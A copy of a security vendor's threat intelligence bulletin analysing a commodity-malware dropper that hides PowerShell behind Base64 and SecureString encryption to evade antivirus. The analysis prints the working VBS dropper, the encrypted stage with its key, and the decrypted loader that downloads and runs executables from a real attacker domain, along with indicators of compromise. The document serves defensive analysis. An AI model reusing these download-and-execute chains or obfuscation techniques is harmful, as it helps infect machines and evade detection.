@@ -1,0 +1,270 @@
+ PowerShell Obfuscation Using SecureString
+
+ https://blogs.blackberry.com/en/2018/09/unpacking-a-packer-powershell-obfuscation-using-securestring
+
+ 
+Introduction
+
+You’d think that life would be pretty hard for threat actors these days, given the plethora of security companies out there feeding insatiable, ever-growing blacklists of malware that track millions upon millions of payload fingerprints.
+
+You’d think getting malware past antivirus products would be a Herculean task, requiring the development of new, never-before-seen custom malware.
+
+If you thought either of those things, you’d be wrong.
+
+Threat actors are increasingly reaching their targets not with exotic, custom payloads but with so-called commodity malware – off-the-shelf programs you can find online, either for free or else for a nominal fee. These are pieces of malware known to all antivirus companies and whose fingerprints (or “signatures”) should be immediately recognizable to them.
+
+So why are threat actors are increasingly using commodity malware? And why are they successful in doing so?
+
+The short answer to both is: obfuscation.
+
+In this Threat Intelligence Bulletin, Cylance explains what obfuscation is and why it works. And we demonstrate how one recently observed obfuscation technique succeeded in bypassing most antivirus products.
+Background and Discussion
+
+Cylance has been tracking a trend that sees threat actors turning to common, commodity malware more and more. They’re doing so because it’s cheap, easy to use and, if found, helps to anonymize them. When the fingerprint of a piece of malware is known to all and is within the reach of everyone, the threat actor can hide amongst an impossibly large group of suspects. The payload signature is essentially rendered meaningless.
+
+How it is that commodity malware succeeds despite having a known signature is a paradox explained via the concept of obfuscation, a technique which effectively changes the overall signature, despite delivering the familiar payload.
+
+Obfuscation shifts the attacker’s focus from customizing the final payload to customizing the delivery method. One can assume that this shift is a response to the way in which many antivirus products go about catching malware.
+
+As alluded to above, many antivirus products rely on signatures to identify malware. For many of them, the signature is just a hash or a simple string. In this context, a hash refers to a unique, alphanumeric representation of a piece of malware. Signatures very often are hashes, but they can also be some other brief representation of a unique bit of code inside a piece of malware.
+
+Obfuscation is a term of art that describes a set of techniques used to evade antivirus products that rely heavily on signatures. These techniques change the overall structure of a piece of malware without altering its function. Often, this has the overall result of creating layers which act to bury the ultimate payload, like the nested figures in a Russian doll.
+
+Common obfuscation techniques include the use of:
+
+    Packers, which compress or “pack” a malware program
+    Crypters, which encrypt a malware program (or portions thereof)
+    Other obfuscators, which mutate – but do not neuter – the malware program in a variety of ways, thus changing the overall number of bytes in the program
+
+The effect of these obfuscation techniques is to alter the hash and, frequently, the signature of the malware, either by changing the size of the file (e.g. packing) or by hiding its unique strings of code from the antivirus product via encryption.
+
+While some antivirus products search for common obfuscating techniques so that they too may be blacklisted, this practice is not nearly as well established as the blacklisting of malware payload signatures.
+
+In the Technical Analysis below, we dissect an example where the method of obfuscation leveraged features of PowerShell, a tool that comes built into Microsoft Windows.
+Technical Analysis
+
+Cylance came across the malware file under analysis, which uses a rare PowerShell obfuscation method, while looking into some fresh and poorly detected malicious scripts. The sample appeared to use several techniques described by Daniel Bohannon on GitHub. The file we analyzed was a ZIP file containing both a PDF document and VBS script:
+
+            50e7fe23731ad94f1714c1a8acfce3f8b6e6e918b3e3aa1daa7275cb6052e68c
+
+At the time we found it, the file was only detected by three antivirus products:
+
+The VBS script used a rudimentary Base64 encoding to obfuscate the first layer.  The contents of this script are displayed below.
+
+Function l(a): With CreateObject("Msxml2.DOMDocument").CreateElement("aux"): .DataType = "bin.base64": .Text = a: l = r(.NodeTypedValue): End
+With: End Function
+
+Function r(b): With CreateObject("ADODB.Stream"): .Type = 1: .Open: .Write b: .Position = 0: .Type = 2: .CharSet = "utf-8": r = .ReadText: .Close:  End
+With: End function
+
+Execute l("RnVuY3Rpb24gR2V0VGltZVpvbmVPZmZzZXQoKQ0KICAgIENvbnN0IHNDb21wdXRlciA9ICIuIg0KDQogICAgRGltIG9XbWlTZXJ2a
+WNlIDogU2V0IG9XbWlTZXJ2aWNlID0gXw0KICAgICAgICBHZXRPYmplY3QoIndpbm1nbXRzOntpbXBlcnNvbmF0aW9uTGV2ZWw9aW1wZXJzb
+25hdGV9IVxcIiBfDQogICAgICAgICAgICAgICAgICAmIHNDb21wdXRlciAmICJccm9vdFxjaW12MiIpDQoNCiAgICBEaW0gY1RpbWVab25lIDogU2V
+0IGNUaW1lWm9uZSA9IF8NCiAgICAgICAgb1dtaVNlcnZpY2UuRXhlY1F1ZXJ5KCJTZWxlY3QgKiBmcm9tIFdpbjMyX1RpbWVab25lIikNCg0KICAg
+IERpbSBvVGltZVpvbmUNCiAgICBGb3IgRWFjaCBvVGltZVpvbmUgaW4gY1RpbWVab25lDQogICAgICAgIEdldFRpbWVab25lT2Zmc2V0ID0gb1Rpb
+WVab25lLkJpYXMgLyA2MA0KICAgICAgICBFeGl0IEZvcg0KICAgIE5leHQNCkVuZCBGdW5jdGlvbg0KDQoNCg0KDQoNClNldCB2ZXJ0dSA9IENyZ
+WF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQoNCnZrMj0iZXJTIg0KDQppZiBHZXRUaW1lWm9uZU9mZnNldCA9IDkgdGhlbg0KDQoJRGltIGh
+1bW0NCglodW1tPSJvZmZpY2UiDQoJdHNzMT0iUG93Ig0KCW9rb2w9InNzIC1jIg0KCW5vcDM9ImhlTGwiDQoJbXVyPSJsZSBoaWQiDQogICAgd
+mVydHUuUnVuKHRzczErdmsyK25vcDMrIiAtd2luZG93c3R5IittdXIrImRlbiAtbm9leGl0IC1leGVjdXRpb25wb2xpY3kgIGJ5cGEiK29rb2wrIm9tbW
+FuZCBJYEVYICgobmVXYC1PYmpgRWNUICgoJ05ldCcrJy4nKydXZWJjJysnbGllbnQnKSkpLigoJ0Rvd25sb2Fkc3QnKydyaScrJ25nJykpLkluVm9rRS
+goKCdodCIrInRwOicrJy8iKyIvcicrJ2F2JysnaWcnKydlbC5jb20vMScrJ2NyLicrJ2RhJysndCcpKSkpICIpDQoJU2V0IHZlcnR1ID0gTm90aGluZw0KCV
+dTY3JpcHQuUXVpdA0KCWVsc2UgDQoJdG9wPTENCmVuZCBpZg0K")
+
+Figure 1: Contents of Initial VBS Script
+
+This script decoded to:
+
+Function GetTimeZoneOffset()
+    Const sComputer = "."
+
+    Dim oWmiService : Set oWmiService = _
+        GetObject("winmgmts:{impersonationLevel=impersonate}!\\" _
+                  & sComputer & "\root\cimv2")
+
+    Dim cTimeZone : Set cTimeZone = _
+        oWmiService.ExecQuery("Select * from Win32_TimeZone")
+
+    Dim oTimeZone
+    For Each oTimeZone in cTimeZone
+        GetTimeZoneOffset = oTimeZone.Bias / 60
+        Exit For
+    Next
+End Function
+
+Set vertu = CreateObject("WScript.Shell")
+
+vk2="erS"
+
+if GetTimeZoneOffset = 9 then
+
+                Dim humm
+                humm="office"
+                tss1="Pow"
+                okol="ss -c"
+                nop3="heLl"
+                mur="le hid"
+    vertu.Run(tss1+vk2+nop3+" -windowsty"+mur+"den -noexit -executionpolicy  bypa"+okol+"ommand I`EX ((neW`-Obj`EcT (('Net'+'.'+'Webc'+'lient'))).(('Downloadst'+'ri'+'ng')).InVokE((('ht"+"tp:'+'/"+"/r'+'av'+'ig'+'el.com/1'+'cr.'+'da'+'t')))) ")
+                Set vertu = Nothing
+                WScript.Quit
+                else
+                top=1
+end if
+
+Figure 2: Decoded Contents of Initial VBS Script
+
+This VBS script downloads and executes the file “hxxp://ravigel[dot]com/1cr[dot]dat” via PowerShell with the following switches: “PowersheLl -windowstyle hidden -noexit -executionpolicy bypass -command IEX(New-Object Net.Webclient)DownloadString.Invoke(‘hxxp://ravigel[dot]com/1cr[dot]dat’)”.
+
+Numerous techniques, like string splitting through concatenation and variable assignment, as well as the use of tick marks “`” and random letter capitalizations, are used to split up words or signatures that antivirus companies commonly rely upon for malicious PowerShell identification.
+
+The file “1cr.dat” is where things got interesting. It uses a method of string encryption inherent in C# called SecureString or more specifically “Marshal.SecureStringToGlobalAllocAnsi”. This is commonly used to encrypt sensitive strings within applications using Microsoft’s built-in DPAPI.
+. ( $ShelliD[1]+$SHeLLid[13]+'x')(([runtiMe.inTERopsErvICes.MArsHAL]::pTRTOstRINGAnsI( [rUntIME.intEROpsERVICeS.MArshAl]::SeCUReSTRiNG
+ToGLObalALLocansI( $('76492d1116743f0423413b16050a5345MgB8ADEAbQAxAE4AZwBKADcAWQBYAFcAaABjAGQAQwBRAFYAVgBrAGIAZQBBA
+HcAPQA9AHwAYg
+A2ADAAZAAwAGIANQBiADQAMgAyADUAYgAwADgAOQBkAGMANQBlADkAYwAyADgAOQBmAGUAMgA5AGIAMgAwADEAMgAzAGUAMQBlAG
+EAYQBkADgAMgBkAGYAZgA4AGYAZAAyADIAZAA0AGEAZgA1ADkANQA3ADQAMQAwADcANQAwADIAMwA4ADAAYwBiADAAOAA5ADQANgA
+3ADcAMwAwADgAMgA2AGIAMgBjAGIAOAA5AGQANABhADYAZQA3ADYAYwA2AGIAMAA3ADcAOABlADgANgAxAGMAOAA5ADUANgBiAGQAM
+wBkADMAMQA4ADEAMgA4ADEAYwBmAGUANQAxADIAOAA2AGIANgA4ADAAOQA0ADYAZgBmADEANwBlADAAMAA5AGMAMwBiADMAYwB
+hADUANwA2AGYAMwBhADIANQA3ADYAMAA1AGMAYgA0AGQAZQA4AGIAMQAwADkAZQBlADkAMwA4AGIANgA3AGQAYQA1AGEAZABlAGYA
+MgBhADMAMQA0ADQAYgAxADAAYQAxADkAZAAzADcAYgBjADgANgBmADYAOAA0ADYANwBmADIAZQBhADQANQBlAGEAZQAzADMAZQA5
+ADgAZAA3AGIAMwA3AGEAZABkADMAMQBkAGUAZAA2AGQAOQBlADcANgAyADAAMAAwADEAOQBjADEAMQBmAGYAOQBjADUAZQBjADY
+AYgA1ADQAMgA4ADAAMABiADUAMQA2ADcANAA4AGMAMQBiAGQAOQA5AGIAMgAwADAANwA2ADgAMwBlAGUANAAwADAAMwAwADIAM
+wA5AGEAOQA4ADQAYgA2ADkAYQAwADEAZAAwADgANAA1AGQAOABmADIAOABiADcANgBlADgAOABmAGYAYgBmADUAOAAxADUAYwA1A
+GIANwA0ADgAMgAwAGQAOABmADQANAA3ADYAMgA4AGYAYgBiAGMANQBmAGEANQAzADIAMQAxADIANwA2AGMAZgBiADgAYQAwADEA
+MQBkADcANwAyADgAYwBmAGIAOQA2AGYAMwA5ADgANAA4ADUAOAA4ADIAYQA4ADMANAA0AGQANABkAGYAMgA5AGIANABhAGYAYQA
+zAGUANwA4ADAANwAzADIANQA0ADEAYwBhAGQANwBkAGIAMgAxAGMAZABmAGMAMAA2AGYAYwA5ADMAYgA5ADIAMAAwADIANwAzA
+GUAZAAyADUAMgA4AGEAZQA2ADIAOAA3ADQAOAAxADQAYQBiADYANAA0ADgANQBhAGYANQA4AGMAYwA0ADUANgBhAGMAYgA5ADM
+AYQBmAGUAYwBmADgANQBlADMAMQA5AGEAMQA5ADcAOABjADYAZgAyADAAMgA4ADgANwA3AGIAMwBmADcANQA5ADQANwBjADYA
+ZgBiAGEAMgBlADEAMABkAGMANAAxAGQANwA2ADIANgA1ADcAYgAwAGYAMwAxADQAMABkADQANwAxADcAOAAxAGYAMgAxAGYAYQBl
+ADYAMQBlADIANgBiADMAMwAzADQAZQBmADYAMQA5ADQAMgAyADMANABlADkAMQA3AGYAYwA0AGYAMwAxADQANwAyAGUAMgAyA
+DkAZgAwADcAZgA3ADkAMwBkADEANwAyADAAZgBkADgAMABmAGMANQA2AGYAMQBkAGIAOQAxADUAZgAzADUAYwA4AGIANwBhAGU
+ANgA5ADQANAAxADIAZABhADAAMgA0ADQANABiADEAZAAxADgANAAwAGEANgBkADAAOQAwADAAMgBkADIAOQAzADQAZQBlAGYAYw
+A5AGMANQA5AGEAYgAxADUANgBkADIANgBhADgAOQBmADYAOABlADUAMgA4ADgAMwAxADAAMgA5ADkAYQBlADcAOQA1AGEANwBmA
+GUAZABkAGYAZgA1ADUAMwBkAGUANwBmADUAOQBkADgAMwA4ADkANQBhAGIAZQA3AGQAYwA0ADkAOABlAGUAMQA1ADMAYQBlADA
+AMgA2ADcAMwA0ADMAYgAwADIAZgBmAGIAYQA2ADUAOQBjADIAYgA4AGQAOAAwAGYANgBiADIANwBkAGEAZABiAGMANAA3ADAAOAA4
+ADgANgBhADAAYgA4ADcAZQA2ADgAMwAzADAAMAAzADQAOQA3AGEANgA2AGYAMwAzADgANQBiAGMANgA1ADYAYwA2ADkAYwA5ADIA
+ZAA3AGIAMwA2AGIAYQA5ADkAMgAxAGYAMAA1ADEAMAA5ADYANAAxADUAMABiADEANAA4ADgANAAzADYANAA0ADMANgBhADQAYgA1
+AGQAYwA4AGUAYQBkADMAYwA5AGYAMABlADEANQA2ADYANQA4AGYANABlADcAOABmADAAMgAzAGQAYwA2AGIAOQA0ADIAZABmAD
+QANQAwADMAZQAxAGEAOQBkADAAYQA0ADUANwBhAGMAYwA2AGEANwA0AGIAYwBkADUAYQA3AGIANgBiAGYANQBlAGMANgBmAGUA
+NwBlADAANABhAGQAMQA4ADMAZAA0ADQANQBlAGQAMgBjADQAZQAxADcAYQBlADMAZgBmAGEAZABlAGYAYQBiAGUANgA5ADgAZgA
+yADYAOAA4ADcAOQAxAGQANgAyAGUAZgBiADYAMAAwAGMANAA5ADkAMgA3ADUAMABlADIAYwBhADUAMQAwAGMAMABlADQANAA3
+ADQAYwAwAGYAZQA0ADQAYwA1ADgAYQA2ADMAYQBjADAAZABiADkAYQAwADAANABiAGQAMwA0ADcANAAzAGQAMgA2ADEAOQBmA
+DgAZQA0AGEAMQA0AGMAYgA0ADEAMQA2ADUANgA5AGIAMgBmADEANABiAGQAYwAwADkAMAAxADkAZgAyAGQAZgBiAGUAYQBmAG
+MAZQBlADcAZAAyADIAOQAyADEAYwBiADMANABlAGYANQBkADkAMABiADUAYgBkADIANQA5ADEAYgAzADYAYQA3AGMAMgA1AGEANAB
+mADgAYwBiAGEAOQBlAGYAZQA5AGUANABjAGYANwAzADQAYgBmADUAYwBmADcAYQAyAGQANABlADMAZgAyADYANwBlADAAOAA3AD
+gANAA0AGMAYgAwAGQAOABiAGIAMQA3AGYAMwA2ADUAMQBiADYANQBlADAAZQA5ADQAMwBmADgAOAA0ADIANwBjADUAOQBjAGY
+AZQAzADUANgA3ADUANgA2AGYAZQA2ADMAZgA4ADcAOQBlADMANwA3AGEAZQA3ADMAOAAxAGMAZgAyADIAMQAwADAAZQAzAGY
+AMQA4AGIAYgA4ADMAZQAwADUAMQBhADgANwA1ADMANQA4AGMAOAAzAGYAYQAxADcAYgBmAGMAOQA4ADMAMgAxAGQAZgBmA
+DYAYQA0AGIAMABmAGIAMQBhADYAZQBmADkAYgBkADMAMQA4ADEAOAA4ADIAYgA2ADUAMgA0AGEAOAAxADAAYgA4AGUAYgBjAGM
+AZgA3ADEAZABiADMAYgAzADIAMABmADcAOQAzADkAOAA0ADcAOQA2ADEAOQA1ADkAMwA1ADgAOQBkAGYAMQA1ADAANwAxAGQA
+MgA4ADkAYwAwADgAMgAwAGUAZgAzADYAOQBhAGUANwBlAGMAMQBkADQANABkADAAOQAzAGUAZgBhADQANAAyAGEAMgBiAGQ
+AMgBmADUAYgA5AGQAMgBkADEAMQA1AGMAYwBjAGYAOQBjADUAOAA2ADAANgAwADAAZQA3AGIAMABiADIAYQBkADcAZgA3AGIAN
+gBmADMAMQBhADIAMAA1ADAAYgAxADQANgA5ADQAMgBhADMAOAA2ADgAOQA4AGEAYgA0ADcAYQAxAGYANQA4ADIAMgBiADYAYQ
+BkAGMAMQBiADIANABhADEAZABhADMAMAAzADcAMgAyADMANAAzADQANAA1ADkAYwBmADIAOAA2ADUAYgBhADUANgAwAGYAMg
+BiADAANwBmAGUANwA5AGIAMgAyAGUAZAA4ADkANwA4ADEAYgBmAGUANwA4ADgAMAA5ADkAMwBhAGQANQA0ADkANwA3AGUAY
+QA0AGEAZQA0ADYANwA2ADcAMAA4ADgAOAA4ADkANAA0ADgAOAA5ADQANwAxADkAZAA3AGUAMgBlAGYAZQBhAGQAOQBkAGUAZ
+QAyADkAZgA3ADkANQBkADUAMwAwADkAYgAzAGIAOAAwAGMAZQAyADUANQBlADUAOAA1ADkANABmAGIAMQA5AGMAZABkADgAO
+QA1ADgANAAwAGEANwBkAGIAMQBiAGYAOABkADcAYQBhAGMANAAyADcANgAzAGEAYwBmAGUAZQBjADAAYgAzAGMAYQBiADIAYwA
+5AGYAZgA2AGQAYwA5ADEAMgAzADQAYQA5AGYAZQBhADUANwA4ADgAZQA2AGQAMwA4ADQAMABlADUAOQBjAGMAMgBjADIAOAB
+lADQAMQA4ADIAZgA2ADcAYwBiAGUAZQAyAGYAOABhADYAOAA3ADMAZgA4AGEAMAAzADMANQAyADgANwA5AGYAYwBlAGEAZgBm
+ADMAOAA1AGUAYgA2ADMAYgBkADIAZQBlADUANwA2ADAAMABiADMAZgBkADUAZgBjADkAOQAzADYAYQBkAGUAMAAwADcAMwAzA
+DkAMwA0AGIAOQAyAGQAMgA5ADYANQBmAGUANwA5ADcAMQAwADQANgAzAGEAOAA1ADQAMQBiAGMAZgAxADkAMQBhAGQAYQ
+A3AGUAZQBkAGQAZQA1ADIAMwA5ADEANQBjADYAYwA4ADEAZgAwADcAMABjADUAYwBlADcAZQA2ADcAZgBkAGIAMgAzAGYAZQA1A
+GMAMgAwAGQANwA3ADYANgA0ADEAMgA3ADgANQA2ADIAZgAxADYAZAA1AGEAZgA5ADIANwBkADMANQA0AGUANQA1ADMAZAAz
+ADgAMABlADEAZgBmAGEANQAxAGYAOABjADIAMQA5ADMAYgA0AGUAMAAxADcANgBhADUAZQAyAGQAZAAwADYAOABhADcAOAAz
+ADIAMgAxADAANwBlAGEAMwBmADMAMAA0ADEAOAA5AGIAMwAzADcAZgAwAGMAMgAyADUANgBiAGEAOABjAGIAYgBiADAAYgBjA
+DkANQBmADkAYgAxADYANgAyAGUAMQAwAGQAMABhADAAOABjADYAMgAwAGUAOQA1AGQAOAAzADYAMgBjAGEAYgAyADgANgBm
+ADMAMQBmADAAYQBiAGIAZABkADkAZgBkAGQANQAwADIAZQBjAGUAZAAxADMANQBkAGEANABiAGIAZQA0ADgANQA4ADYANwBjA
+DMAOAA2ADcAYQAwADMAYwAwADQAYgBkADcAOQA4AGMANwBjAGMAZAAxADMANABlADMAMQAxADgAMgBhAGYAYgBiAGIAMQAw
+AGEAMwA0ADUAZgA0AGQAZQBmADMANwA5ADIANwA3AGEAZABmAGMAMgBiADIAMABlADcAYQBlADQAZgA4ADEAZAAxAGQAMgB
+kADkAOQA3AGEAOABmADAAYwAxADAAYQA1ADYAMQA4AGYAMAA3AGIANgA5ADAAYQBkADkAMwBjAGMAMwAzADQANwAyADkAMA
+A5AGYANQAwADkANwAxAGUANwBkAGEAYwAwAGUAMgBhAGQAOABiADQANABlADAAZQA3ADUAZAA4ADIAYwA2ADkANgAyADYAYgA
+5ADMANwA1ADYANwBhAGUAYQAzAGIAYgBhADEAMwA1AGUANABmADMAMAA5ADkAOQAxAGYAYQBmAGEAYQAwAGEAOAAwADAAM
+gBjAGEAMQAxAGMAZAA5AGUANQAyAGEAMAAxADQAZQBmAGEANgBhAGMAMwBjADQAMAA0ADcAZQBiADgAMgAzAGEANgA2ADE
+AYwBjAGQANQBjADIANAA0ADcAMQBmAGMAZABkADAANAA4ADQANwA0ADIAOAAxADcAZQA1ADMANQA1AGEAZgBjAGMAYwBiADc
+AYwAyAGIAYQBhAGYAYQA5AGUAMwBkADYAYgAzADQANwA5ADIAZAA0ADEAZQA2AGMAZAA5AGYAMAAzAGMAMAA1AGIAMAAwADI
+AZgA3ADEAMABmAGQAMgBkADkAZQA2ADYAMwA5ADkAOQBiADkANwAwAGYANABiADIAMwA1ADIAZgA3ADMANgBiADQAYwBmAD
+gAZAAzAGUAZQBkADgANgAwADAAYwA2AGEAOAA3AGQANABmAGQANAA2ADAAMgBjAGQAZgBjAGUAMwBjADQAZgBmADAAOAAw
+ADkAOABiADcAOQBiAGUAYQBhAGQANQAyADcAMQA0ADgAZgA5AGUAOAAwAGIAOQAwAGYAYwBlADMAMQBhAGEAYgBmADQAZgA
+yAGMAYgBkADYAZAA3ADkANAAxADUAMgAwAGYAMQBjADIAZQA3ADgAMwAyADgAOQA1AGMANwA3ADQANABkAGQANwAyADUAN
+gA4AGQANAAxADQAZAAwAGQAZgA0ADEANABkADAAZAA5ADYANQBiADYAOAA2ADIAMQAzADgANQBiADcANwA0AGQAMgA0ADQ
+ANgA3ADQANQA4ADQAYwBlADgANQBhADgAMABhADAAMAA5ADUANAA3ADUAZgA1AGIAMwBmAGYAMwBlAGUAYgA2ADcANwA2A
+DgAOQA5ADIANwBkAGIANwA4ADMANwAyADMAZAA5ADcAYwBjADgAMABiADUAYwA2ADkAZAAxAGIAOQA0ADgAYQBjADQANQA2A
+DQANAAwAGQAOQAxADUANgA4ADYAMQA5AGQAZABiADgAYwA4ADgANABhADAANgBkAGYAMABkADgAMQA4AGYANQBjAGEAMgA
+yADMAZgBiADIAOABhADUAMwAxAGUAYgA1AGUAZQBjAGMAYgBmADUANgA3ADkAZQA0ADkAYwAzAGEAZgBkADEANwA5AGIAZgA1A
+DkAZgA5ADYANwBhADUAOQBmAGMAMABkAGQAYgBjAGQAMwBhADIANgA1AGEAYgA1ADQAYwA2AGIAMwBlADAANAA4ADIAOQA1A
+DAAMAA3AGIAOQBlAGUAMAAxADMAYgAwADMAOQA1ADEAMQA3AGUANQAyAGMAOAA4ADgAYwBiAGUAYQAzADQANQAzADQAO
+QAwAGUAMgA3ADEAMgBhAGYANwA4ADUAZQA0AGEAZQAzADgAOQAyADcAOAAxADEANAA4AGQAMQBlADAAYQA1ADkAYwA1AGM
+AMgBlADIAYQA4AGYANQAzAGEAYwA4AGUAMwA0ADIANwAwAGQAZQAxADgANgBhADcAMAA5ADQAMgBmADUANgA1AGEAZQAzAD
+cAYwA5ADkAMgBkAGUAOAA1AGIANwBlADgAMwA2ADcAOABkADIAYQBlAGEANQBkADEAMwBjADIAMAA1ADQAOQAxADgAMQA1AGQ
+AZAA4AGUAMQA2ADIAMAA0ADIANwA0ADgAYgAzADEAMABiADYAYQBhAGMAMgA3AGIANwAzADcAMQBlADcANwBiADQAMwBhAD
+UAZQAyAGMAMwBlADUANQA5AGMAZAAyADEAYQA4ADAAMgBjADUAZgBiAGYAMgA1ADQANQAzADYAYwBhAGQAMQAzADAANgA
+1ADgAZQA3AGYAZgAzAGUANwBjADYAMABhAGIAOQA4AGUANwAyADMAMgA0AGMANQAzADIANwA2ADUAMwAzADUAOQA1ADYA
+MQAxADYANABjAGYAOQA1ADEAMQBmADUAZQAyADcAMAA0ADYAYQBjADcAMAAxAGEANQBiAGMAMwA4ADAAMwBkADUAYwAy
+ADkAYgAzADcAOQA2AA==' | COnVErtTo-SecUrEStrING -Ke  145,96,34,150,165,222,211,99,165,119,17,98,225,14,249,255) ) ) ) )
+
+Figure 3: Contents of cr1.dat
+
+The contents of “cr1.dat” are decrypted using the 16byte key at the end of the script “0x91, 0x60, 0x22, 0x96, 0xa5, 0xde, 0xd3, 0x63, 0xa5, 0x77, 0x11, 0x62, 0xe1, 0xe, 0xf9, 0xff”. The string decodes to:
+do{
+    sleep 41;
+    ping -n 6 -w 100 www.microsoft.com > $env:tmp\license.pem;
+    $rpm=Get-Random;
+    $ruf = $env:public;
+    (New-Object System.Net.WebClient).DownloadFile.Invoke("http://ravigel.com/top.dat","$ruf\$rpm.zip")
+    }
+while(!$?);
+$mall = New-Object -ComObject shell.application;sleep 7;
+$holl = $mall.NameSpace("$ruf\$rpm.zip");
+foreach ($item in $holl.items())
+{
+    $mall.Namespace("$ruf\").CopyHere($item)};
+    gci -Path "$ruf\" -Filter *.tab | ren -NewName "$rpm.txt";
+    gci "$ruf\$rpm.txt" | % { (gc "$ruf\$rpm.txt") | ? { (1) -notcontains $_.ReadCount} | sc -path $ruf\$rpm.txt };
+    [string]$hex=get-content –path $ruf\$rpm.txt;
+    [Byte[]] $temp=$hex –split ‘ ‘;
+    [System.IO.File]::WriteAllBytes("$ruf\$rpm.exe", $temp);
+    &Start-Process $ruf\$rpm.exe
+
+Figure 4: Decrypted String in cr1.dat
+
+The first set of instructions is there to attempt to defeat automated sandbox solutions. The script itself would download the file “ravigel.com/top.dat” which was a ZIP archive containing another file named “top.tab”. “top.tab” was a Portable Executable (PE file) encoded by the ordinal representation of each hex byte separated by a space character, “ “ prefaced with the heading “google\r\n”.
+f = open(‘top.tab’,’rb’).read()
+h = f.replace(‘\r’,’’).replace(‘\n’)
+h = h.split(‘ ‘)
+out = ‘’
+for b in h[6:]:
+   out+=chr(int(b))
+
+
+When decoded, the binary payload had the following hash:
+
+        f3cf988a64c1732b6b58a72922e93d182ba64298f6beae5de0c8de21477a9474
+
+The payload was only detected by two products when first deployed by the cyber-criminals, but at the time we came across it, 18 products detected the payload. The payload is a simple espionage tool widely known to the security community. It is considered commodity malware. It communicates to the command-and-control (C2) server “siberponis[dot]com” and is also configured to communicate to a backup server “baferdifo[dot]com”, which does not currently resolve to an IP address.
+Conclusion
+
+Threat actors use obfuscation techniques to try to stay one step ahead of current detection methodologies. The net result is malware which is more effective at evading antivirus products and which, if caught, is easier to alter.
+
+This trend runs counter to a widely-held assumption in the information security space which holds that highly customized malware paired with zero-day exploits are deserving of the most attention. And while use of those tools is concerning and should be monitored, attention should not be completely divested from those threat actors – including advanced threat actors – who are succeeding right now at bypassing antivirus products with tools that are not “zero-day” but “every day.”
+Appendix
+
+Domains:
+
+    Ravigel[dot]com
+    Siberponis[dot]com
+    Baferdifo[dot]com
+
+IP Addresses related to siberponis[dot]com:
+
+149.129.220.242
+161.117.9.13
+212.92.98.68
+46.21.248.199
+47.74.189.69
+78.155.206.114
+85.119.150.167
+92.53.66.244
+92.53.77.108
+95.179.138.241
+95.213.195.213
+95.213.199.244
